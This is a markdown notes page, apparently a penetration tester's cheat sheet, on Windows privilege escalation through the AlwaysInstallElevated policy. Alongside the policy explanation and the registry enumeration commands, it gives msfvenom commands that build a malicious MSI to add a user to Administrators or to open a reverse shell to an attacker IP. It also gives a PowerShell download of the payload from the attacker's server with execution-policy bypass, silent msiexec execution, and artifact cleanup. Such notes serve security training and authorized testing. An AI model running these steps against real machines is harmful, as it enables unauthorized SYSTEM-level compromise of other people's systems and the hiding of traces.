---
created: 2026-08-26
updated: 2026-09-20
tags:
  - Windows
  - Windows_PrivEsc
status: complete
---
>[!abstract] **Scope**: Local Windows privilege escalation via `AlwaysInstallElevated`. 

- [ ] Query `HKLM` and `HKCU` registry hives for `AlwaysInstallElevated` policy settings (`reg query`).
- [ ] Craft a custom `.msi` payload with command execution or a reverse shell using `msfvenom`.
- [ ] Transfer the `.msi` payload to the target host.
- [ ] Execute silent installation via `msiexec.exe` with `/quiet`, `/qn`, and `/i` flags.
- [ ] Verify elevated access.
## `AlwaysInstallElevated`

>**`AlwaysInstallElevated`** is a Windows Group Policy setting that allows non-administrative users to install Microsoft Installer (`.msi`) packages with elevated privileges (`NT AUTHORITY\SYSTEM`).

- By default, Windows restricts elevated installer execution to administrators. However, when `AlwaysInstallElevated` is enabled, Windows Installer (`msiexec.exe`) executes **any** `.msi` file **under the `SYSTEM` account**.
- This is effectively equivalent to granting full administrative rights to any user.

>[!note] See [`AlwaysInstallElevated — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated).

---

- For the policy to take effect, `AlwaysInstallElevated` registry keys must be **present** and **set to `1` (`0x1`)** in **both `HKEY_LOCAL_MACHINE` and `HKEY_CURRENT_USER`** under `Software\Policies\Microsoft\Windows\Installer`:
	- `HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer`
	- `HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer`

- If `AlwaysInstallElevated` is enabled in `HKLM` but missing or disabled (`0x0`) in `HKCU` (or vice versa), Windows Installer refuses to grant elevated privileges to non-administrative user sessions.

>[!important] An MSI supplied to `msiexec.exe` doesn't have to be stored in a special directory. It can be executed from any location readable by the initiating user and accessible to Windows installer (e.g., `C:\Users\Public\package.msi`, `C:\Users\<user>\Downloads\package.msi`, `C:\Temp\package.msi`, `\\server\share\package.msi`, etc.).

>[!interesting]+ `C:\Windows\Installer`
>- `C:\Windows\Installer` is the protected Windows Installer cache. 
>- Windows uses this directory to retain cached MSI (Microsoft Installer) and MSP (Microsoft Patch) data required for operations like repairing installed applications, adding/rolling back patches, performing upgrades, etc.

>[!note]+ Windows installer itself is located at `C:\Windows\System32\msiexec.exe` (64-bit). On 64-bit Windows, the 32-bit version is normally located at `C:\Windows\SysWOW64\msiexec.exe`.
## Enumerating `AlwaysInstallElevated` policy

- Query the `AlwaysInstallElevated` registry key under `HKLM` (`HKEY_LOCAL_MACHINE`):

```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```powershell
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name 'AlwaysInstallElevated' 2>$null
```

- Query the `AlwaysInstallElevated` registry key under `HKCU` (`HKEY_CURRENT_USER`):

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```powershell
Get-ItemProperty -Path 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name 'AlwaysInstallElevated' 2>$null
```

> [!example]-
> - Both registry queries must return `0x1`:
> ```powershell
> PS C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
>
> HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
>     AlwaysInstallElevated    REG_DWORD    0x1
>```
>
>```powershell
> PS C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
>
> HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
>     AlwaysInstallElevated    REG_DWORD    0x1
> ```

- Audit system configuration automatically using [`SharpUp`](https://github.com/ghostpack/sharpup):

```powershell
.\SharpUp.exe audit
```

- Audit system configuration using [`PowerUp`](https://janikvonrotz.github.io/PowerShell-PowerUp/):

```powershell
Invoke-AllChecks
```

## Generating and executing MSI payloads

- Generate a `.msi` installer payload on your local machine using `msfvenom` that adds your user account to the local `Administrators` group:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators jdoe /add" -f msi -o adduser.msi
```

- Generate a `.msi` installer payload that spawns a reverse shell:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip_address> LPORT=443 -f msi -o reverse.msi
```

- Transfer the `.msi` payload to the target system (see [[🛠️ Windows file transfers]]):

```bash
python3 -m http.server 8080
```

```powershell
powershell -ep bypass -c "(New-Object Net.WebClient).DownloadFile('http://<attacker_ip_address>:8080/adduser.msi','C:\Temp\adduser.msi')"
```

- Execute the `.msi` payload silently via `msiexec.exe`:

```powershell
msiexec.exe /quiet /qn /i C:\Temp\adduser.msi
```

- Command-line options for `msiexec.exe`:

| Flag | Description |
| :--- | :--- |
| `/i` | Specifies normal installation of the target `.msi` package file. |
| `/quiet` | Suppresses all user interface prompts and notifications. |
| `/qn` | Configures no UI display during installation execution. |
| `/norestart` | Prevents automatic system reboots after installation completes. |

>[!tip]+
>- Verify local `Administrators` group membership:
> ```powershell
> net localgroup administrators
> ```

>[!tip]+ Cleanup
>- Uninstall the payload package to remove installation artifacts:
> ```powershell
> msiexec.exe /quiet /qn /uninstall C:\Temp\adduser.msi
> ```
>- Delete the payload file from disk:
> ```powershell
> Remove-Item -Path C:\Temp\adduser.msi -Force
> ```

## References and further reading

- [`AlwaysInstallElevated policy — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated)
- [`msiexec command syntax — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec)
- [`Privilege Escalation with AlwaysInstallElevated — HackTricks`](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated)
- [`SharpUp — GitHub`](https://github.com/GhostPack/SharpUp)
